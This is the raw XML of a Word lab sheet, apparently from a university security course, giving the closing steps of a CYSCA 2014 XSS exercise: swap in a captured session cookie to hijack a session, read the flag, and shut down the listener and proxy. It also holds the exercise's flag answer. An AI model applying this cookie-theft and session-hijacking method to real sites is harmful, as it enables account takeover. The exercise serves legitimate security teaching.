      </w:pPr>
    </w:p>
    <w:p w14:paraId="7C42653F" w14:textId="77777777" w:rsidR="0048371D" w:rsidRPr="00FA4E5F" w:rsidRDefault="0048371D" w:rsidP="00E75062">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="4"/>
        </w:numPr>
        <w:spacing w:line="240" w:lineRule="auto"/>
        <w:jc w:val="both"/>
        <w:rPr>
          <w:b/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:lang w:val="en-AU"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00FA4E5F">
        <w:rPr>
          <w:b/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:lang w:val="en-AU"/>
        </w:rPr>
        <w:t xml:space="preserve">Now we edit out cookie, changing the session ID to the captured one and refresh the page. </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1A332A42" w14:textId="77777777" w:rsidR="0048371D" w:rsidRPr="00FA4E5F" w:rsidRDefault="005F0448" w:rsidP="00E75062">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:spacing w:line="240" w:lineRule="auto"/>
        <w:ind w:left="284"/>
        <w:jc w:val="both"/>
        <w:rPr>
          <w:b/>
          <w:color w:val="4F81BD"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:lang w:val="en-AU"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00FA4E5F">
        <w:rPr>
          <w:b/>
          <w:color w:val="4F81BD"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:lang w:val="en-AU"/>
        </w:rPr>
        <w:t xml:space="preserve">You need to complete this: </w:t>
      </w:r>
      <w:r w:rsidR="0048371D" w:rsidRPr="00FA4E5F">
        <w:rPr>
          <w:b/>
          <w:color w:val="4F81BD"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:lang w:val="en-AU"/>
        </w:rPr>
        <w:t>You can figure out how to do that. (HINT: edit the cookie jar)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="37E8EFEE" w14:textId="77777777" w:rsidR="0048371D" w:rsidRPr="00FA4E5F" w:rsidRDefault="0048371D" w:rsidP="00E75062">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="4"/>
        </w:numPr>
        <w:spacing w:line="240" w:lineRule="auto"/>
        <w:jc w:val="both"/>
        <w:rPr>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:lang w:val="en-AU"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00FA4E5F">
        <w:rPr>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:lang w:val="en-AU"/>
        </w:rPr>
        <w:t xml:space="preserve">Return to the web page and refresh (F5). </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7E496203" w14:textId="77777777" w:rsidR="0048371D" w:rsidRPr="00FA4E5F" w:rsidRDefault="0048371D" w:rsidP="00E75062">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="4"/>
        </w:numPr>
        <w:spacing w:line="240" w:lineRule="auto"/>
        <w:jc w:val="both"/>
        <w:rPr>
          <w:b/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:lang w:val="en-AU"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00FA4E5F">
        <w:rPr>
          <w:b/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:lang w:val="en-AU"/>
        </w:rPr>
        <w:t>What is the flag?</w:t>
      </w:r>
      <w:r w:rsidR="00AF1AF4" w:rsidRPr="00FA4E5F">
        <w:rPr>
          <w:b/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:lang w:val="en-AU"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidR="00AF1AF4" w:rsidRPr="00FA4E5F">
        <w:rPr>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:lang w:val="en-AU"/>
        </w:rPr>
        <w:t>You should be able to see the following: (Again, this is just an indicator or label built-in CYSCA web server to confirm your XSS operations is successful).</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="60420426" w14:textId="77777777" w:rsidR="00AF1AF4" w:rsidRPr="00FA4E5F" w:rsidRDefault="00AF1AF4" w:rsidP="00E75062">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:spacing w:line="240" w:lineRule="auto"/>
        <w:ind w:left="644"/>
        <w:jc w:val="both"/>
        <w:rPr>
          <w:color w:val="FF0000"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:lang w:val="en-AU"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00FA4E5F">
        <w:rPr>
          <w:color w:val="FF0000"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:lang w:val="en-AU"/>
        </w:rPr>
        <w:t>In real situation, there is no such confirmation, hackers just continue on with his/her “works”</w:t>
      </w:r>
      <w:r w:rsidR="00E75062" w:rsidRPr="00FA4E5F">
        <w:rPr>
          <w:color w:val="FF0000"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:lang w:val="en-AU"/>
        </w:rPr>
        <w:t xml:space="preserve"> and waiting for any information relevant for them.</w:t>
      </w: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8"/>
      </w:tblGrid>
      <w:tr w:rsidR="00AF1AF4" w:rsidRPr="00FA4E5F" w14:paraId="01EAC4F9" w14:textId="77777777" w:rsidTr="00FA4E5F">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="8522" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
          </w:tcPr>
          <w:p w14:paraId="5FA617C5" w14:textId="77777777" w:rsidR="00AF1AF4" w:rsidRPr="00FA4E5F" w:rsidRDefault="00AF1AF4" w:rsidP="00FA4E5F">
            <w:pPr>
              <w:pStyle w:val="ListParagraph"/>
              <w:spacing w:line="240" w:lineRule="auto"/>
              <w:ind w:left="284"/>
              <w:jc w:val="both"/>
              <w:rPr>
                <w:color w:val="FF0000"/>
                <w:sz w:val="22"/>
                <w:szCs w:val="22"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00FA4E5F">
              <w:rPr>
                <w:color w:val="FF0000"/>
                <w:sz w:val="22"/>
                <w:szCs w:val="22"/>
                <w:lang w:val="en-AU"/>
              </w:rPr>
              <w:t>OrganicShantyAbsent505</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="26934738" w14:textId="77777777" w:rsidR="00AF1AF4" w:rsidRPr="00FA4E5F" w:rsidRDefault="00AF1AF4" w:rsidP="00E75062">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:spacing w:line="240" w:lineRule="auto"/>
        <w:ind w:left="644"/>
        <w:jc w:val="both"/>
        <w:rPr>
          <w:b/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:lang w:val="en-AU"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="7B20031D" w14:textId="77777777" w:rsidR="00CA3B8D" w:rsidRPr="00FA4E5F" w:rsidRDefault="001C35C4" w:rsidP="00E75062">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:spacing w:line="240" w:lineRule="auto"/>
        <w:ind w:left="284"/>
        <w:jc w:val="both"/>
        <w:rPr>
          <w:b/>
          <w:color w:val="00B050"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:lang w:val="en-AU"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:noProof/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:pict w14:anchorId="757D1FBA">
          <v:shape id="_x0000_i1045" type="#_x0000_t75" style="width:415.35pt;height:250.15pt;visibility:visible">
            <v:imagedata r:id="rId28" o:title=""/>
          </v:shape>
        </w:pict>
      </w:r>
    </w:p>
    <w:p w14:paraId="1624633A" w14:textId="77777777" w:rsidR="0048371D" w:rsidRPr="00FA4E5F" w:rsidRDefault="0048371D" w:rsidP="00E75062">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:spacing w:line="240" w:lineRule="auto"/>
        <w:jc w:val="both"/>
        <w:rPr>
          <w:b/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:lang w:val="en-AU"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="0CFF6CEF" w14:textId="77777777" w:rsidR="00E816EC" w:rsidRPr="00FA4E5F" w:rsidRDefault="00E816EC" w:rsidP="00E75062">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:spacing w:line="240" w:lineRule="auto"/>
        <w:ind w:left="284"/>
        <w:jc w:val="both"/>
        <w:rPr>
          <w:b/>
          <w:color w:val="002060"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:lang w:val="en-AU"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00FA4E5F">
        <w:rPr>
          <w:b/>
          <w:color w:val="002060"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:lang w:val="en-AU"/>
        </w:rPr>
        <w:t>It is possible that the truncated script tag will "break" the database. If you want to start with a clean slate (so to speak), go back to the Blog link and start commenting to a different po</w:t>
      </w:r>
      <w:r w:rsidR="00EB5680" w:rsidRPr="00FA4E5F">
        <w:rPr>
          <w:b/>
          <w:color w:val="002060"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:lang w:val="en-AU"/>
        </w:rPr>
        <w:t>s</w:t>
      </w:r>
      <w:r w:rsidRPr="00FA4E5F">
        <w:rPr>
          <w:b/>
          <w:color w:val="002060"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:lang w:val="en-AU"/>
        </w:rPr>
        <w:t xml:space="preserve">t. </w:t>
      </w:r>
      <w:r w:rsidR="00C90784" w:rsidRPr="00FA4E5F">
        <w:rPr>
          <w:b/>
          <w:color w:val="002060"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:lang w:val="en-AU"/>
        </w:rPr>
        <w:t>If that doesn't work, shutdown CYSCA2014InABox (not Kali) completely an</w:t>
      </w:r>
      <w:r w:rsidR="00EB5680" w:rsidRPr="00FA4E5F">
        <w:rPr>
          <w:b/>
          <w:color w:val="002060"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:lang w:val="en-AU"/>
        </w:rPr>
        <w:t>d</w:t>
      </w:r>
      <w:r w:rsidR="00C90784" w:rsidRPr="00FA4E5F">
        <w:rPr>
          <w:b/>
          <w:color w:val="002060"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:lang w:val="en-AU"/>
        </w:rPr>
        <w:t xml:space="preserve"> then re-start it. </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3E02BD87" w14:textId="77777777" w:rsidR="001001F5" w:rsidRPr="00FA4E5F" w:rsidRDefault="001001F5" w:rsidP="00E75062">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="4"/>
        </w:numPr>
        <w:spacing w:line="240" w:lineRule="auto"/>
        <w:jc w:val="both"/>
        <w:rPr>
          <w:b/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:lang w:val="en-AU"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00FA4E5F">
        <w:rPr>
          <w:b/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:lang w:val="en-AU"/>
        </w:rPr>
        <w:t>Closing:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0A2DC06F" w14:textId="77777777" w:rsidR="00E75062" w:rsidRPr="00FA4E5F" w:rsidRDefault="001001F5" w:rsidP="00FA4E5F">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="20"/>
        </w:numPr>
        <w:spacing w:line="240" w:lineRule="auto"/>
        <w:jc w:val="both"/>
        <w:rPr>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:lang w:val="en-AU"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00FA4E5F">
        <w:rPr>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:lang w:val="en-AU"/>
        </w:rPr>
        <w:t>O</w:t>
      </w:r>
      <w:r w:rsidR="007E2C61" w:rsidRPr="00FA4E5F">
        <w:rPr>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:lang w:val="en-AU"/>
        </w:rPr>
        <w:t>n</w:t>
      </w:r>
      <w:r w:rsidRPr="00FA4E5F">
        <w:rPr>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:lang w:val="en-AU"/>
        </w:rPr>
        <w:t xml:space="preserve"> Kali Terminal press CTRL+C to stop the</w:t>
      </w:r>
      <w:r w:rsidR="007E2C61" w:rsidRPr="00FA4E5F">
        <w:rPr>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:lang w:val="en-AU"/>
        </w:rPr>
        <w:t xml:space="preserve"> SimpleHTTPServer listener. The</w:t>
      </w:r>
      <w:r w:rsidR="00AF1AF4" w:rsidRPr="00FA4E5F">
        <w:rPr>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:lang w:val="en-AU"/>
        </w:rPr>
        <w:t>n</w:t>
      </w:r>
      <w:r w:rsidR="007E2C61" w:rsidRPr="00FA4E5F">
        <w:rPr>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:lang w:val="en-AU"/>
        </w:rPr>
        <w:t xml:space="preserve"> Exit on prompt</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="183C1461" w14:textId="77777777" w:rsidR="007E2C61" w:rsidRPr="00FA4E5F" w:rsidRDefault="007E2C61" w:rsidP="00FA4E5F">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="20"/>
        </w:numPr>
        <w:spacing w:line="240" w:lineRule="auto"/>
        <w:jc w:val="both"/>
        <w:rPr>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:lang w:val="en-AU"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00FA4E5F">
        <w:rPr>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:lang w:val="en-AU"/>
        </w:rPr>
        <w:t>Burpsuite – File – Exit. Don’t save</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="53E68D9A" w14:textId="77777777" w:rsidR="007E2C61" w:rsidRPr="00FA4E5F" w:rsidRDefault="007E2C61" w:rsidP="00E75062">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="20"/>
        </w:numPr>
        <w:spacing w:line="240" w:lineRule="auto"/>
        <w:jc w:val="both"/>
        <w:rPr>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:lang w:val="en-AU"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00FA4E5F">
        <w:rPr>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:lang w:val="en-AU"/>
        </w:rPr>
        <w:t>Firefox – Change setting for Proxy back to Auto. Then close.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4ED327E8" w14:textId="77777777" w:rsidR="001001F5" w:rsidRPr="00FA4E5F" w:rsidRDefault="001001F5" w:rsidP="00E75062">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:spacing w:line="240" w:lineRule="auto"/>
        <w:ind w:left="284"/>
        <w:jc w:val="both"/>
        <w:rPr>
          <w:b/>
          <w:color w:val="002060"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:lang w:val="en-AU"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:sectPr w:rsidR="001001F5" w:rsidRPr="00FA4E5F">
      <w:headerReference w:type="default" r:id="rId29"/>
      <w:footerReference w:type="default" r:id="rId30"/>
      <w:pgSz w:w="11906" w:h="16838"/>
      <w:pgMar w:top="1440" w:right="1800" w:bottom="1440" w:left="1800" w:header="708" w:footer="708"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C69F" w14:textId="77777777" w:rsidR="007B0416" w:rsidRDefault="007B0416">
      <w:r>
        <w:separator/>
      </w:r>
    </w:p>
  </w:endnote>
  <w:endnote w:type="continuationSeparator" w:id="0">
    <w:p w14:paraId="59285F09" w14:textId="77777777" w:rsidR="007B0416" w:rsidRDefault="007B0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AF93" w14:textId="59B64FA9" w:rsidR="00EB19C9" w:rsidRPr="00FA4E5F" w:rsidRDefault="00000000">
    <w:pPr>
      <w:pStyle w:val="Footer"/>
      <w:ind w:right="360"/>
      <w:rPr>
        <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri" w:cs="Calibri"/>
        <w:sz w:val="16"/>
        <w:szCs w:val="16"/>
      </w:rPr>
    </w:pPr>
    <w:r>
      <w:rPr>
        <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri" w:cs="Calibri"/>
        <w:sz w:val="16"/>
        <w:szCs w:val="16"/>
      </w:rPr>
      <w:pict w14:anchorId="422A9C89">
        <v:shapetype id="_x0000_t202" coordsize="21600,21600" o:spt="202" path="m,l,21600r21600,l21600,xe">
          <v:stroke joinstyle="miter"/>
          <v:path gradientshapeok="t" o:connecttype="rect"/>
        </v:shapetype>
        <v:shape id="_x0000_s1025" type="#_x0000_t202" style="position:absolute;margin-left:466.9pt;margin-top:.05pt;width:38.25pt;height:13.65pt;z-index:1;mso-wrap-distance-left:0;mso-wrap-distance-right:0;mso-position-horizontal-relative:page" stroked="f">
          <v:fill opacity="0" color2="black"/>
          <v:textbox inset="0,0,0,0">
            <w:txbxContent>
              <w:p w14:paraId="58E1C56D" w14:textId="77777777" w:rsidR="00EB19C9" w:rsidRPr="00FA4E5F" w:rsidRDefault="00EB19C9">
                <w:pPr>
                  <w:pStyle w:val="Footer"/>
                  <w:rPr>
                    <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri" w:cs="Calibri"/>
                    <w:sz w:val="16"/>
                    <w:szCs w:val="16"/>
                  </w:rPr>
                </w:pPr>
                <w:r w:rsidRPr="00FA4E5F">
                  <w:rPr>
                    <w:rStyle w:val="PageNumber"/>
                    <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri" w:cs="Calibri"/>
                    <w:sz w:val="16"/>
                    <w:szCs w:val="16"/>
                  </w:rPr>
                  <w:t xml:space="preserve">Page </w:t>
                </w:r>
                <w:r w:rsidRPr="00FA4E5F">
                  <w:rPr>
                    <w:rStyle w:val="PageNumber"/>
                    <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri" w:cs="Calibri"/>
                    <w:sz w:val="16"/>
                    <w:szCs w:val="16"/>
                  </w:rPr>
                  <w:fldChar w:fldCharType="begin"/>
                </w:r>
                <w:r w:rsidRPr="00FA4E5F">
                  <w:rPr>
                    <w:rStyle w:val="PageNumber"/>
                    <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri" w:cs="Calibri"/>
                    <w:sz w:val="16"/>
                    <w:szCs w:val="16"/>
                  </w:rPr>
                  <w:instrText xml:space="preserve"> PAGE </w:instrText>
                </w:r>
                <w:r w:rsidRPr="00FA4E5F">
                  <w:rPr>
                    <w:rStyle w:val="PageNumber"/>
                    <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri" w:cs="Calibri"/>
                    <w:sz w:val="16"/>
                    <w:szCs w:val="16"/>
                  </w:rPr>
                  <w:fldChar w:fldCharType="separate"/>
                </w:r>
                <w:r w:rsidR="005F0448" w:rsidRPr="00FA4E5F">
                  <w:rPr>
                    <w:rStyle w:val="PageNumber"/>
                    <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri" w:cs="Calibri"/>
                    <w:noProof/>
                    <w:sz w:val="16"/>
                    <w:szCs w:val="16"/>
                  </w:rPr>
                  <w:t>2</w:t>
                </w:r>
                <w:r w:rsidRPr="00FA4E5F">
                  <w:rPr>
                    <w:rStyle w:val="PageNumber"/>
                    <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri" w:cs="Calibri"/>
                    <w:sz w:val="16"/>
                    <w:szCs w:val="16"/>
                  </w:rPr>
                  <w:fldChar w:fldCharType="end"/>
                </w:r>
              </w:p>
            </w:txbxContent>
          </v:textbox>
          <w10:wrap type="square" side="largest" anchorx="page"/>
        </v:shape>
      </w:pict>
    </w:r>
    <w:r w:rsidR="00057682" w:rsidRPr="00FA4E5F">
      <w:rPr>
        <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri" w:cs="Calibri"/>
        <w:sz w:val="16"/>
        <w:szCs w:val="16"/>
      </w:rPr>
      <w:t>COS</w:t>
    </w:r>
    <w:r w:rsidR="00942DF4" w:rsidRPr="00FA4E5F">
      <w:rPr>
        <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri" w:cs="Calibri"/>
        <w:sz w:val="16"/>
        <w:szCs w:val="16"/>
      </w:rPr>
      <w:t>30015</w:t>
    </w:r>
    <w:r w:rsidR="00EB19C9" w:rsidRPr="00FA4E5F">
      <w:rPr>
        <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri" w:cs="Calibri"/>
        <w:i/>
        <w:sz w:val="16"/>
        <w:szCs w:val="16"/>
      </w:rPr>
      <w:t xml:space="preserve"> Lab 7</w:t>
    </w:r>
  </w:p>
  <w:p w14:paraId="3A606CC0" w14:textId="77777777" w:rsidR="00EB19C9" w:rsidRDefault="00EB19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E8E35" w14:textId="77777777" w:rsidR="007B0416" w:rsidRDefault="007B0416">
      <w:r>
        <w:separator/>
      </w:r>
    </w:p>
  </w:footnote>
  <w:footnote w:type="continuationSeparator" w:id="0">
    <w:p w14:paraId="3ADBC660" w14:textId="77777777" w:rsidR="007B0416" w:rsidRDefault="007B0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6D038" w14:textId="77777777" w:rsidR="00EB19C9" w:rsidRPr="00FA4E5F" w:rsidRDefault="00EB19C9">
    <w:pPr>
      <w:pStyle w:val="Header"/>
      <w:rPr>
        <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri" w:cs="Calibri"/>
      </w:rPr>
    </w:pPr>
    <w:r w:rsidRPr="00FA4E5F">
      <w:rPr>
        <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri" w:cs="Calibri"/>
        <w:b/>
        <w:color w:val="000000"/>
      </w:rPr>
      <w:t>Name: ______________________________________ Student ID:______________</w:t>
    </w:r>
    <w:r w:rsidRPr="00FA4E5F">
      <w:rPr>
        <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri" w:cs="Calibri"/>
        <w:b/>
        <w:color w:val="000000"/>
      </w:rPr>
      <w:br/>
    </w:r>
  </w:p>
  <w:p w14:paraId="1B9ECF02" w14:textId="77777777" w:rsidR="00EB19C9" w:rsidRDefault="00EB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hint="default"/>
      </w:rPr>
    </w:lvl>
  </w:abstractNum>
  <w:abstractNum w:abstractNumId="3" w15:restartNumberingAfterBreak="0">
    <w:nsid w:val="00000004"/>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1115" w:hanging="360"/>
      </w:pPr>
      <w:rPr>
        <w:rFonts w:ascii="Symbol" w:hAnsi="Symbol" w:cs="Symbol" w:hint="default"/>
        <w:b/>
        <w:lang w:val="en-AU"/>
      </w:rPr>
    </w:lvl>
    <w:lvl w:ilvl="1">
      <w:start w:val="1"/>
      <w:numFmt w:val="lowerLetter"/>
      <w:lvlText w:val="%2."/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:tabs>
          <w:tab w:val="num" w:pos="0"/>
        </w:tabs>
        <w:ind w:left="1835" w:hanging="360"/>
      </w:pPr>
      <w:rPr>
        <w:rFonts w:ascii="Symbol" w:hAnsi="Symbol" w:cs="Symbol" w:hint="default"/>
        <w:b/>
        <w:lang w:val="en-AU"/>
      </w:rPr>
    </w:lvl>
    <w:lvl w:ilvl="2">
      <w:start w:val="1"/>
      <w:numFmt w:val="lowerRoman"/>
      <w:lvlText w:val="%3."/>
      <w:lvlJc w:val="right"/>
      <w:pPr>
        <w:tabs>
          <w:tab w:val="num" w:pos="0"/>
        </w:tabs>
        <w:ind w:left="2555" w:hanging="180"/>
      </w:pPr>
      <w:rPr>
        <w:rFonts w:ascii="Symbol" w:hAnsi="Symbol" w:cs="Symbol" w:hint="default"/>
        <w:b/>
        <w:lang w:val="en-AU"/>
      </w:rPr>
    </w:lvl>
    <w:lvl w:ilvl="3">
      <w:start w:val="1"/>
      <w:numFmt w:val="decimal"/>
      <w:lvlText w:val="%4."/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:tabs>
          <w:tab w:val="num" w:pos="0"/>
        </w:tabs>
        <w:ind w:left="3275" w:hanging="360"/>
      </w:pPr>
      <w:rPr>
        <w:rFonts w:ascii="Symbol" w:hAnsi="Symbol" w:cs="Symbol" w:hint="default"/>
        <w:b/>
        <w:lang w:val="en-AU"/>
      </w:rPr>
    </w:lvl>
    <w:lvl w:ilvl="4">
      <w:start w:val="1"/>
      <w:numFmt w:val="lowerLetter"/>
      <w:lvlText w:val="%5."/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:tabs>
          <w:tab w:val="num" w:pos="0"/>
        </w:tabs>
        <w:ind w:left="3995" w:hanging="360"/>
      </w:pPr>
      <w:rPr>
        <w:rFonts w:ascii="Symbol" w:hAnsi="Symbol" w:cs="Symbol" w:hint="default"/>
        <w:b/>
        <w:lang w:val="en-AU"/>
      </w:rPr>
    </w:lvl>
    <w:lvl w:ilvl="5">
      <w:start w:val="1"/>
      <w:numFmt w:val="lowerRoman"/>
      <w:lvlText w:val="%6."/>
      <w:lvlJc w:val="right"/>
      <w:pPr>
        <w:tabs>
          <w:tab w:val="num" w:pos="0"/>
        </w:tabs>
        <w:ind w:left="4715" w:hanging="180"/>
      </w:pPr>
      <w:rPr>
        <w:rFonts w:ascii="Symbol" w:hAnsi="Symbol" w:cs="Symbol" w:hint="default"/>
        <w:b/>
        <w:lang w:val="en-AU"/>
      </w:rPr>
    </w:lvl>
    <w:lvl w:ilvl="6">
      <w:start w:val="1"/>
      <w:numFmt w:val="decimal"/>
      <w:lvlText w:val="%7."/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:tabs>
          <w:tab w:val="num" w:pos="0"/>
        </w:tabs>
        <w:ind w:left="5435" w:hanging="360"/>
      </w:pPr>
      <w:rPr>
        <w:rFonts w:ascii="Symbol" w:hAnsi="Symbol" w:cs="Symbol" w:hint="default"/>
        <w:b/>
        <w:lang w:val="en-AU"/>
      </w:rPr>
    </w:lvl>
    <w:lvl w:ilvl="7">
      <w:start w:val="1"/>
      <w:numFmt w:val="lowerLetter"/>
      <w:lvlText w:val="%8."/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:tabs>
          <w:tab w:val="num" w:pos="0"/>
        </w:tabs>
        <w:ind w:left="6155" w:hanging="360"/>
      </w:pPr>
      <w:rPr>
        <w:rFonts w:ascii="Symbol" w:hAnsi="Symbol" w:cs="Symbol" w:hint="default"/>
        <w:b/>
        <w:lang w:val="en-AU"/>
      </w:rPr>
    </w:lvl>
    <w:lvl w:ilvl="8">
      <w:start w:val="1"/>
      <w:numFmt w:val="lowerRoman"/>
      <w:lvlText w:val="%9."/>
      <w:lvlJc w:val="right"/>
      <w:pPr>
        <w:tabs>
          <w:tab w:val="num" w:pos="0"/>
        </w:tabs>
        <w:ind w:left="6875" w:hanging="180"/>
      </w:pPr>
      <w:rPr>
        <w:rFonts w:ascii="Symbol" w:hAnsi="Symbol" w:cs="Symbol" w:hint="default"/>
        <w:b/>
        <w:lang w:val="en-AU"/>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B7F4AD7"/>
    <w:multiLevelType w:val="hybridMultilevel"/>
    <w:tmpl w:val="E0329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316455"/>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B985F57"/>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3FF7E2D"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="00000004"/>
    <w:lvl w:ilvl="0">
      <w:start w:val="1"/>
      <w:numFmt w:val="decimal"/>
      <w:lvlText w:val="%1."/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:tabs>
          <w:tab w:val="num" w:pos="720"/>
        </w:tabs>
        <w:ind w:left="720"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64379CC"/>
    <w:multiLevelType w:val="hybridMultilevel"/>
    <w:tmpl w:val="9F1681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38A437E6"/>
    <w:multiLevelType w:val="hybridMultilevel"/>
    <w:tmpl w:val="77E4092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4036CF3"/>
    <w:multiLevelType w:val="hybridMultilevel"/>
    <w:tmpl w:val="FA32E57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15:restartNumberingAfterBreak="0">
    <w:nsid w:val="44165301"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="25160E98"/>
    <w:lvl w:ilvl="0">
      <w:start w:val="1"/>
      <w:numFmt w:val="bullet"/>
      <w:lvlText w:val=""/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:tabs>
          <w:tab w:val="num" w:pos="644"/>
        </w:tabs>
        <w:ind w:left="644" w:hanging="360"/>
      </w:pPr>
      <w:rPr>
        <w:rFonts w:ascii="Symbol" w:hAnsi="Symbol"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0AB7C51"/>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5681FDE"/>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5B034EF"/>
    <w:multiLevelType w:val="hybridMultilevel"/>
    <w:tmpl w:val="E4D09F1A"/>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16cid:durableId="820728304">
